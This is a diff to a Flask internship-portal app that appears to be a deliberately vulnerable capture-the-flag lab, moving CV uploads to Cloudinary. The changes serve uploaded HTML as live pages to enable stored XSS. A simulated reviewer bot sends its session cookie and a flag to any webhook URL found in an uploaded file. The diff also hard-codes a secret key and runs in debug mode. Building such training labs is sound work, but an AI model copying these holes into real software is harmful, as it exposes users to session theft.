@@ -18,10 +18,39 @@ from urllib.parse import quote
 from urllib.error import URLError
 import jwt
 from werkzeug.utils import secure_filename
+from io import BytesIO
 from dotenv import load_dotenv
 from upstash_redis import Redis
+import cloudinary
+import cloudinary.uploader
+import cloudinary.api
+from cloudinary import utils as cloudinary_utils
 
 load_dotenv()
+
+# Configurar Cloudinary: priorizar CLOUDINARY_URL, luego variables individuales
+cloudinary_url_env = os.getenv('CLOUDINARY_URL')
+if cloudinary_url_env:
+    # Si está CLOUDINARY_URL, Cloudinary la lee automáticamente del entorno
+    # cloudinary.config() sin parámetros lee CLOUDINARY_URL automáticamente
+    cloudinary.config()
+    # Verificar que la configuración se aplicó correctamente
+    import logging
+    logging.info(f"Cloudinary configurado desde CLOUDINARY_URL: cloud_name={cloudinary.config().cloud_name}")
+else:
+    # Fallback a variables individuales
+    cloud_name = os.getenv('CLOUDINARY_CLOUD_NAME', '')
+    api_key = os.getenv('CLOUDINARY_API_KEY', '')
+    api_secret = os.getenv('CLOUDINARY_API_SECRET', '')
+    if cloud_name and api_key and api_secret:
+        cloudinary.config(
+            cloud_name=cloud_name,
+            api_key=api_key,
+            api_secret=api_secret,
+            secure=True
+        )
+        import logging
+        logging.info(f"Cloudinary configurado desde variables individuales: cloud_name={cloud_name}")
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'internlink_secret_2024'
@@ -85,7 +114,12 @@ class _Db:
 
 db = _Db()
 
-os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
+# Crear directorio de uploads solo si existe el sistema de archivos (desarrollo local)
+# En Vercel/serverless, los archivos van a Cloudinary
+try:
+    os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
+except (OSError, PermissionError):
+    pass  # En serverless no hay sistema de archivos, se usa Cloudinary
 os.makedirs('logs', exist_ok=True)
 
 
@@ -756,15 +790,94 @@ def upload_cv():
     filename = secure_filename(file.filename)
     user = get_current_user()
     user_filename = f"{user['id']}_{filename}"
-    filepath = os.path.join(app.config['UPLOAD_FOLDER'], user_filename)
-    file.save(filepath)
+    
+    # Subir a Cloudinary (resource_type="raw" para preservar el contenido exacto, incluyendo HTML)
+    cloudinary_url = None
+    cloudinary_public_id = None
+    has_cloudinary_url = bool(os.getenv('CLOUDINARY_URL'))
+    has_cloudinary_keys = bool(os.getenv('CLOUDINARY_CLOUD_NAME') and os.getenv('CLOUDINARY_API_KEY'))
+    cloudinary_configured = has_cloudinary_url or has_cloudinary_keys
+    
+    log_entry(f"Cloudinary check: URL={has_cloudinary_url}, Keys={has_cloudinary_keys}, Configurado={cloudinary_configured}")
+    
+    if cloudinary_configured:
+        try:
+            file_content = file.read()
+            file.seek(0)
+            
+            log_entry(f"Intentando subir a Cloudinary: {user_filename} (tamaño: {len(file_content)} bytes)")
+            # Subir archivo como público explícitamente
+            # IMPORTANTE: No usar 'folder' junto con 'public_id' que ya incluye la ruta
+            # Usar solo public_id con la ruta completa para evitar problemas
+            public_id_full = f"internlink/cvs/{user_filename}"
+            
+            # Intentar eliminar el archivo anterior si existe (para evitar problemas con archivos privados antiguos)
+            try:
+                cloudinary.uploader.destroy(public_id_full, resource_type="raw", invalidate=True)
+                log_entry(f"Archivo anterior eliminado (si existía): {public_id_full}")
+            except Exception as del_err:
+                # No es crítico si no existe
+                log_entry(f"No se pudo eliminar archivo anterior (puede que no exista): {str(del_err)}")
+            
+            upload_result = cloudinary.uploader.upload(
+                file_content,
+                public_id=public_id_full,  # Incluir la ruta completa en public_id
+                resource_type="raw",  # "raw" preserva el contenido sin transformaciones (importante para XSS)
+                overwrite=True,
+                type="upload",  # type="upload" hace el archivo público por defecto
+                invalidate=True,  # Invalidar caché
+            )
+            cloudinary_url = upload_result['secure_url']
+            # Guardar también el public_id completo para poder descargarlo después
+            cloudinary_public_id = upload_result.get('public_id', public_id_full)
+            
+            # Generar URL firmada para bypassear restricciones de cuentas gratuitas (PDFs bloqueados por defecto)
+            # Las URLs firmadas permiten acceso incluso si la cuenta tiene restricciones
+            signed_url = cloudinary_utils.cloudinary_url(
+                cloudinary_public_id,
+                resource_type="raw",
+                secure=True,
+                type="upload",
+                sign_url=True  # Firmar la URL para bypassear restricciones
+            )[0]
+            
+            log_entry(f"CV subido exitosamente a Cloudinary: {user_filename} -> {cloudinary_url} (public_id: {cloudinary_public_id})")
+            log_entry(f"URL pública: {cloudinary_url}")
+            log_entry(f"URL firmada (bypass restricciones): {signed_url}")
+            log_entry(f"Tipo de entrega en respuesta: {upload_result.get('type', 'N/A')}")
+            
+            # Usar la URL firmada para almacenar (bypassea restricciones de cuentas gratuitas)
+            cloudinary_url = signed_url
+        except Exception as e:
+            error_msg = str(e)
+            import traceback
+            log_entry(f"ERROR al subir a Cloudinary: {error_msg}\n{traceback.format_exc()}")
+            # Si Cloudinary está configurado pero falla, NO hacer fallback - mostrar error
+            return jsonify({'error': f'Error al subir el archivo a Cloudinary: {error_msg}. Verifica tu configuración.'}), 500
+    
+    # Fallback solo si Cloudinary NO está configurado (desarrollo local sin Cloudinary)
+    if not cloudinary_url and not cloudinary_configured:
+        if os.path.exists(app.config['UPLOAD_FOLDER']):
+            filepath = os.path.join(app.config['UPLOAD_FOLDER'], user_filename)
+            file.save(filepath)
+            cloudinary_url = f"/view-cv/{user_filename}"
+            log_entry(f"CV guardado localmente (Cloudinary no configurado): {user_filename}")
+        else:
+            return jsonify({'error': 'Cloudinary no configurado y no hay sistema de archivos disponible'}), 500
+    elif not cloudinary_url:
+        # Cloudinary estaba configurado pero no se obtuvo URL (no debería llegar aquí)
+        return jsonify({'error': 'Error: Cloudinary configurado pero no se obtuvo URL'}), 500
 
-    # Guardar referencia en el perfil del usuario
+    # Guardar URL de Cloudinary en el perfil del usuario
     user_key = user.get('user_key', f"{user['role']}:{user['id']}")
-    db.hset(user_key, 'cv_path', user_filename)
+    db.hset(user_key, 'cv_path', cloudinary_url)
+    db.hset(user_key, 'cv_filename', user_filename)  # Guardar también el filename para referencia
+    # Guardar public_id de Cloudinary para poder descargarlo con la API si es necesario
+    if cloudinary_public_id:
+        db.hset(user_key, 'cv_cloudinary_id', cloudinary_public_id)
 
-    # Procesar CV de forma automática
-    process_cv(user_filename)
+    # Procesar CV de forma automática (pasa la URL de Cloudinary y el public_id si está disponible)
+    process_cv(cloudinary_url, user_filename)
 
     return jsonify({
         'success': True,
@@ -773,15 +886,75 @@ def upload_cv():
     })
 
 
-def _extract_webhook_from_html(filepath):
-    """Extrae la primera URL tipo webhook (http(s)) del archivo, para simular exfiltración."""
+def _extract_webhook_from_html(file_url_or_path, cloudinary_public_id=None):
+    """Extrae la primera URL tipo webhook (http(s)) del archivo, para simular exfiltración.
+    file_url_or_path puede ser una URL de Cloudinary, una ruta local, o una ruta relativa /view-cv/...
+    cloudinary_public_id: si es una URL de Cloudinary, usar la API para descargar en lugar de HTTP directo."""
     try:
-        with open(filepath, 'rb') as f:
-            header = f.read(5)
-        if header == b'%PDF-':
+        # Si es una URL de Cloudinary, descargar usando la URL (puede ser firmada o pública)
+        if file_url_or_path.startswith('https://res.cloudinary.com/') or file_url_or_path.startswith('http://res.cloudinary.com/'):
+            # Si la URL ya está firmada (contiene /s--), usarla directamente
+            # Si no está firmada y tenemos public_id, generar URL firmada para bypassear restricciones
+            try:
+                log_entry(f"Descargando archivo desde Cloudinary: {file_url_or_path}")
+                # Usar Request con headers para evitar problemas de autenticación
+                req = Request(file_url_or_path)
+                req.add_header('User-Agent', 'Mozilla/5.0')
+                response = urlopen(req, timeout=10)
+                content_bytes = response.read()
+                log_entry(f"Archivo descargado exitosamente desde Cloudinary: {len(content_bytes)} bytes")
+            except Exception as e:
+                log_entry(f"Error al descargar desde Cloudinary: {str(e)}")
+                # Si falla y tenemos public_id, generar URL firmada para bypassear restricciones
+                if cloudinary_public_id:
+                    try:
+                        # Generar URL firmada para bypassear restricciones de cuentas gratuitas
+                        signed_url = cloudinary_utils.cloudinary_url(
+                            cloudinary_public_id, 
+                            resource_type="raw", 
+                            secure=True,
+                            type="upload",
+                            sign_url=True  # Firmar la URL para bypassear restricciones
+                        )[0]
+                        log_entry(f"Intentando descargar con URL firmada (bypass restricciones): {signed_url}")
+                        req2 = Request(signed_url)
+                        req2.add_header('User-Agent', 'Mozilla/5.0')
+                        response = urlopen(req2, timeout=10)
+                        content_bytes = response.read()
+                        log_entry(f"Archivo descargado usando URL firmada: {len(content_bytes)} bytes")
+                    except Exception as url_err:
+                        log_entry(f"Error también con URL firmada: {str(url_err)}")
+                        return None
+                else:
+                    return None
+        elif file_url_or_path.startswith('http://') or file_url_or_path.startswith('https://'):
+            # Otra URL HTTP (no Cloudinary)
+            response = urlopen(file_url_or_path, timeout=10)
+            content_bytes = response.read()
+        elif file_url_or_path.startswith('/view-cv/'):
+            # Ruta relativa /view-cv/filename -> convertir a ruta local
+            filename = file_url_or_path.replace('/view-cv/', '')
+            local_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+            if os.path.exists(local_path):
+                with open(local_path, 'rb') as f:
+                    content_bytes = f.read()
+            else:
+                return None
+        else:
+            # Ruta local absoluta (fallback para desarrollo)
+            if os.path.exists(file_url_or_path):
+                with open(file_url_or_path, 'rb') as f:
+                    content_bytes = f.read()
+            else:
+                return None
+        
+        # Verificar si es PDF real
+        if content_bytes[:5] == b'%PDF-':
             return None
-        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-            content = f.read()
+        
+        # Leer como texto
+        content = content_bytes.decode('utf-8', errors='ignore')
+        
         # Buscar URLs http(s) en el contenido (p. ej. var w = "https://webhook.site/...")
         match = re.search(r'https?://[^\s"\'<>)\];]+', content)
         if not match:
@@ -791,12 +964,14 @@ def _extract_webhook_from_html(filepath):
         if 'localhost' in url or '127.0.0.1' in url:
             return None
         return url
-    except Exception:
+    except Exception as e:
+        log_entry(f"Error al extraer webhook de {file_url_or_path}: {str(e)}")
         return None
 
 
-def process_cv(filename):
-    """Proceso automático que simula la revisión del CV por parte del sistema (empresa abre el CV)."""
+def process_cv(file_url, filename):
+    """Proceso automático que simula la revisión del CV por parte del sistema (empresa abre el CV).
+    file_url: URL de Cloudinary o ruta local."""
     company = db.hgetall('company:1')
     if company:
         bot_session = secrets.token_hex(32)
@@ -807,6 +982,7 @@ def process_cv(filename):
         db.hmset(f'review:{review_id}', {
             'id': review_id,
             'filename': filename,
+            'file_url': file_url,
             'status': 'processed',
             'reviewer': 'system_bot',
             'session_token': bot_session,
@@ -814,43 +990,118 @@ def process_cv(filename):
             'processed_at': datetime.now().isoformat(),
         })
 
-        log_entry(f"CV revisado automáticamente — Sesión del bot: {bot_session} — Archivo: {filename}")
+        log_entry(f"CV revisado automáticamente — Sesión del bot: {bot_session} — Archivo: {filename} — URL: {file_url}")
+
+        # Buscar el public_id de Cloudinary en Redis (si existe)
+        cloudinary_public_id = None
+        for key in db.keys('student:*'):
+            user = db.hgetall(key)
+            if user.get('cv_filename') == filename:
+                cloudinary_public_id = user.get('cv_cloudinary_id')
+                break
 
         # Simular que la empresa abrió el CV: si el archivo es HTML con webhook, enviar la cookie de la empresa
-        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-        if os.path.exists(filepath):
-            webhook = _extract_webhook_from_html(filepath)
-            if webhook:
-                flag_act2 = 'FLAG{stored_xss_persisted}'
-                cookie_value = f"session_token={bot_session}"
-                exfil_url = f"{webhook.rstrip('/')}?c={quote(cookie_value)}&flag={quote(flag_act2)}"
-                try:
-                    req = Request(exfil_url, headers={'User-Agent': 'Mozilla/5.0 (compatible; InternLink/1.0)'})
-                    urlopen(req, timeout=5)
-                except (URLError, OSError):
-                    pass
+        webhook = _extract_webhook_from_html(file_url, cloudinary_public_id)
+        log_entry(f"Webhook extraído del CV: {webhook if webhook else 'No encontrado'}")
+        if webhook:
+            flag_act2 = 'FLAG{stored_xss_persisted}'
+            cookie_value = f"session_token={bot_session}"
+            exfil_url = f"{webhook.rstrip('/')}?c={quote(cookie_value)}&flag={quote(flag_act2)}"
+            try:
+                req = Request(exfil_url, headers={'User-Agent': 'Mozilla/5.0 (compatible; InternLink/1.0)'})
+                urlopen(req, timeout=5)
+            except (URLError, OSError):
+                pass
 
 
 @app.route('/view-cv/<filename>')
 def view_cv(filename):
-    """Servir el CV: PDF real se muestra con visor nativo; otro contenido (p. ej. HTML) como HTML."""
+    """Servir el CV: PDF real se muestra con visor nativo; otro contenido (p. ej. HTML) como HTML.
+    Si el archivo está en Cloudinary, redirige o sirve desde ahí."""
+    # Buscar el CV en Redis por filename
+    cv_url = None
+    for key in db.keys('student:*'):
+        user = db.hgetall(key)
+        if user.get('cv_filename') == filename:
+            cv_url = user.get('cv_path')
+            break
+    
+    # Si encontramos URL de Cloudinary, redirigir o servir desde ahí
+    if cv_url and (cv_url.startswith('http://') or cv_url.startswith('https://')):
+        # Para HTML malicioso: servir directamente desde Cloudinary para que el JS se ejecute
+        # Cloudinary sirve archivos raw sin transformaciones si usamos resource_type="raw"
+        try:
+            response = urlopen(cv_url, timeout=10)
+            content = response.read()
+            
+            # Si es PDF real, servir como PDF
+            if content[:5] == b'%PDF-':
+                return send_file(
+                    BytesIO(content),
+                    mimetype='application/pdf',
+                    as_attachment=False,
+                    download_name=filename,
+                )
+            # Si es HTML, servir como HTML (importante para XSS)
+            return content, 200, {'Content-Type': 'text/html; charset=utf-8'}
+        except Exception as e:
+            # Si falla, intentar con URL firmada (bypass restricciones de cuentas gratuitas)
+            log_entry(f"Error al cargar desde URL pública: {str(e)}, intentando con URL firmada")
+            try:
+                # Buscar public_id en Redis
+                cloudinary_public_id = None
+                for key in db.keys('student:*'):
+                    user = db.hgetall(key)
+                    if user.get('cv_filename') == filename:
+                        cloudinary_public_id = user.get('cv_cloudinary_id')
+                        break
+                
+                if cloudinary_public_id:
+                    # Generar URL firmada para bypassear restricciones
+                    signed_url = cloudinary_utils.cloudinary_url(
+                        cloudinary_public_id,
+                        resource_type="raw",
+                        secure=True,
+                        type="upload",
+                        sign_url=True
+                    )[0]
+                    log_entry(f"Usando URL firmada: {signed_url}")
+                    response = urlopen(signed_url, timeout=10)
+                    content = response.read()
+                    
+                    # Si es PDF real, servir como PDF
+                    if content[:5] == b'%PDF-':
+                        return send_file(
+                            BytesIO(content),
+                            mimetype='application/pdf',
+                            as_attachment=False,
+                            download_name=filename,
+                        )
+                    # Si es HTML, servir como HTML (importante para XSS)
+                    return content, 200, {'Content-Type': 'text/html; charset=utf-8'}
+                else:
+                    return "Error al cargar el archivo: no se encontró public_id", 500
+            except Exception as e2:
+                log_entry(f"Error también con URL firmada: {str(e2)}")
+                return f"Error al cargar el archivo: {str(e2)}", 500
+    
+    # Fallback: buscar localmente (solo para desarrollo)
     filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-    if not os.path.exists(filepath):
-        return "Archivo no encontrado", 404
-    # Detección ligera: si es PDF real, el navegador lo renderiza
-    with open(filepath, 'rb') as f:
-        header = f.read(5)
-    if header == b'%PDF-':
-        return send_file(
-            filepath,
-            mimetype='application/pdf',
-            as_attachment=False,
-            download_name=filename,
-        )
-    # Cualquier otro contenido (p. ej. HTML renombrado como .pdf) se sirve como HTML
-    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-        content = f.read()
-    return content, 200, {'Content-Type': 'text/html; charset=utf-8'}
+    if os.path.exists(filepath):
+        with open(filepath, 'rb') as f:
+            header = f.read(5)
+        if header == b'%PDF-':
+            return send_file(
+                filepath,
+                mimetype='application/pdf',
+                as_attachment=False,
+                download_name=filename,
+            )
+        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+        return content, 200, {'Content-Type': 'text/html; charset=utf-8'}
+    
+    return "Archivo no encontrado", 404
 
 
 @app.route('/api/profile/update', methods=['PUT'])
@@ -1315,4 +1566,10 @@ def admin_list_users():
 if __name__ == '__main__':
     init_db()
     create_debug_log()
+    # Verificar configuración de Cloudinary
+    cloudinary_check = os.getenv('CLOUDINARY_URL') or (os.getenv('CLOUDINARY_CLOUD_NAME') and os.getenv('CLOUDINARY_API_KEY'))
+    if cloudinary_check:
+        log_entry(f"Cloudinary configurado: cloud_name={os.getenv('CLOUDINARY_CLOUD_NAME', 'N/A')}")
+    else:
+        log_entry("ADVERTENCIA: Cloudinary no configurado - se usará almacenamiento local (no funciona en Vercel)")
     app.run(debug=True, host='0.0.0.0', port=5000)
